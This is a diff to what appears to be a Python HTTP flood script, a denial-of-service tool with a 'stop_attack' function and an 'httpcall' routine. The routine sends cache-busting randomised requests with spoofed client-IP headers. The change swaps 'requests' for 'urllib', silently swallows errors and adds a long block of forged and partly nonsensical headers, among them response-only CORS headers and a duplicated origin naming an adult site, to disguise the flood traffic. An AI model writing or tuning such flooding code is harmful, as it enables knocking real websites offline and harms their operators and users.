@@ -5,7 +5,8 @@ import re
 import ipaddress
 import time
 from datetime import datetime, timedelta
-import requests
+import urllib.request
+import urllib.error
 
 url = ''
 host = ''
@@ -54,8 +55,6 @@ def stop_attack():
     global flag
     flag = 2
 
-session = requests.Session()
-
 def httpcall(url):
     request_url = url + ("&" if url.count("?") > 0 else "?") + buildblock(random.randint(3, 10)) + '=' + buildblock(random.randint(3, 10))
     headers = {
@@ -88,11 +87,30 @@ def httpcall(url):
         'X-XSS-Protection': '1; mode=block',
         'Via': '1.1 google',
         'True-Client-IP': generate_real_ip(),
+        'Range': 'bytes=0-1023',
+        'TE': 'Trailers',
+        'If-None-Match': 'W/"92d08190a37c41:0"',
+        'If-Modified-Since': 'Thu, 12 Jan 2017 13:50:52 GMT',
+        'Content-Type': 'text/plain;charset=UTF-8',
+        'Access-Control-Allow-Origin': '*',
+        'Access-Control-Allow-Credentials': 'true',
+        'Access-Control-Allow-Methods': 'POST, GET, OPTIONS, PUT, DELETE',
+        'Access-Control-Allow-Headers': 'Content-Type',
+        'Access-Control-Max-Age': '3600',
+        'Access-Control-Expose-Headers': 'Content-Length',
+        'Access-Control-Request-Headers': 'X-Requested-With, Content-Type, Origin, Authorization, Accept, Client-Security-Token',
+        'Access-Control-Request-Method': 'GET',
+        'Access-Control-Allow-Origin': 'https://www.xvideos.com',
+        'X-Content-Type-Options': 'nosniff',
+        'X-XSS-Protection': '1; mode=block',
+        'X-Frame-Options': 'SAMEORIGIN',
+        'Content-Security-Policy': "default-src 'none'; style-src 'self'; img-src 'self' data:; font-src 'self'; script-src 'self'; base-uri 'self'; form-action 'self'; frame-ancestors 'self';"
     }
     try:
-        response = session.get(request_url, headers=headers)
-    except requests.exceptions.RequestException as e:
-        print(f"Erro na solicitação: {e}")
+        req = urllib.request.Request(request_url, headers=headers)
+        urllib.request.urlopen(req)
+    except urllib.error.URLError:
+        pass
     else:
         inc_counter()
 
